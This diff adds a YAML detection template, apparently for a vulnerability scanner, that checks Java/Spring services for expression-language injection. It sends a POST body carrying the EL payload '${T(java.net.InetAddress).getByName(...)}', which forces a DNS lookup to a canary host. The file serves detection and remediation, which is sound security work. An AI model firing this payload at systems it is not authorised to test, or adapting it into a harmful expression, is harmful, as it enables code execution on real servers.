@@ -1,0 +1,24 @@
+schema_version: rce-finder/v2
+id: java-el-safe-oob
+name: Java expression-language context safe callback validation
+severity: high
+vuln_class: el-injection
+cwe: ["CWE-917"]
+technologies: ["java", "jvm", "spring"]
+prerequisites:
+  required_technologies: ["java"]
+  allowed_methods: ["POST"]
+  allowed_content_types: ["application/json"]
+mode: safe-validation
+confidence_requirements: ["exact probe ID and DNS protocol OOB match"]
+remediation: "Do not evaluate untrusted expression-language input. Apply the relevant framework patch and test with a patched fixture."
+references: ["https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection"]
+oob_protocol: dns
+method: POST
+path: ""
+timeout_seconds: 3
+body_content_type: application/json
+injection_points:
+  - location: body
+    name: expression
+payload: "${T(java.net.InetAddress).getByName('{{canary}}')}"
